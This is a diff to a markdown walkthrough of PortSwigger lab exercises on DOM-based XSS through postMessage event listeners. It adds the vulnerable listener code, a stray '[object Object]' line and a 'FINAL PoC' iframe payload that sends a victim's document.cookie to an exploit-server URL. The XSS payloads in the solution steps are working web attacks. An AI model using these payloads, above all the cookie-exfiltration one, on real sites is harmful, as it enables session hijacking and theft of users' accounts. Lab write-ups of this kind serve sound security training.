@@ -16,6 +16,22 @@ Reference: https://portswigger.net/web-security/dom-based/controlling-the-web-me
 <!-- omit in toc -->
 ### Solution
 1. Notice that the home page contains an ``addEventListener()`` call that listens for a web message.
+
+tag:
+[object Object]
+
+```html
+</section>
+<!-- Ads to be inserted here -->
+<div id='ads'>
+</div>
+<script>
+window.addEventListener('message', function(e) {
+document.getElementById('ads').innerHTML = e.data;
+})
+</script>
+```
+
 2. Go to the exploit server and add the following iframe to the body. Remember to add your own lab ID:
 ```html
 <iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
@@ -42,6 +58,32 @@ When the iframe loads, the ``postMessage()`` method sends the JavaScript payload
 ## DOM XSS using web messages and JSON.parse
 Reference: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse
 
+
+
+ <script>
+                        window.addEventListener('message', function(e) {
+                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+                            document.body.appendChild(iframe);
+                            try {
+                                d = JSON.parse(e.data);
+                            } catch(e) {
+                                return;
+                            }
+                            switch(d.type) {
+                                case "page-load":
+                                    ACMEplayer.element.scrollIntoView();
+                                    break;
+                                case "load-channel":
+                                    ACMEplayer.element.src = d.url;
+                                    break;
+                                case "player-height-changed":
+                                    ACMEplayer.element.style.width = d.width + "px";
+                                    ACMEplayer.element.style.height = d.height + "px";
+                                    break;
+                            }
+                        }, false);
+                    </script>
+
 <!-- omit in toc -->
 ### Solution
 1. Notice that the home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using ``JSON.parse()``. In the JavaScript, we can see that the event listener expects a ``type`` property and that the ``load-channel`` case of the ``switch`` statement changes the ``iframe src`` attribute.
@@ -50,6 +92,12 @@ Reference: https://portswigger.net/web-security/dom-based/controlling-the-web-me
 <iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 ```
 3. Store the exploit and deliver it to the victim.
+
+FINAL PoC:
+
+```html
+<iframe src=https://0a3f009a0378f123456234fc00170043.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:document.location=`https://exploit-0a2800123456f9c7818a3305011700f0.exploit-server.net/?kookie=`+document.cookie\"}","*")'>
+```
    
 When the iframe we constructed loads, the ``postMessage()`` method sends a web message to the home page with the type ``load-channel``. The event listener receives the message and parses it using ``JSON.parse()`` before sending it to the switch.
 
